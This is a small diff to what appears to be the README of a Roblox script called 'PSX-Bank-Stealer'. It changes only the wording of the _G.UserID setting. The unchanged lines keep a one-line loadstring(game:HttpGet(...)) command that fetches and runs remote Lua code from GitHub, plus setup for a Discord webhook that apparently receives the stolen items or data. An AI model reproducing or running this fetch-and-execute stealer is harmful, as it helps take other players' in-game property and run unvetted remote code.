@@ -9,7 +9,7 @@ _G.LoadingScreenText = " "
 loadstring(game:HttpGet('https://raw.githubusercontent.com/ixhd/PSX-Bank-Stealer/main/aftermath.lua'))()
 ```
 
-**_G.UserID** as roblox ID
+**_G.UserID** as your Roblox User ID
 
 **_G.Webhook** as your Discord Webhook
 
